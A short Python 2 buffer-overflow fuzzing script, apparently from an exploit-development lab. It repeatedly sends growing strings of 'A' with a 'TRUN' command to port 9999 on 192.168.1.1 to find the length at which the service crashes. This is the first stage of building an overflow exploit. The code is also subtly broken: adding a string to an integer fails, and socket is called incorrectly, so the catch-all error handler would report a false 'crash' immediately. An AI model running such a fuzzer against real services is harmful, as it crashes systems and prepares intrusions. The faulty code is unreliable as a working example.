#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" + 100# initiating  a variable string

while True:
	try:
			s = socket(socket.AF_INET,socket.SOCK_STREAM)#IPv4 connection
			s.connect(('192.168.1.1', 9999))#connection initated
			s.send(('TRUN /.:/' + buffer))# sending message
			s.close()#close connection
			sleep(1)# 1 sec delay
			buffer = buffer + "A"*100
	except:
			print "Fuzzing crashed at %s bytes" % (str(len(buffer)))
			sys.exit()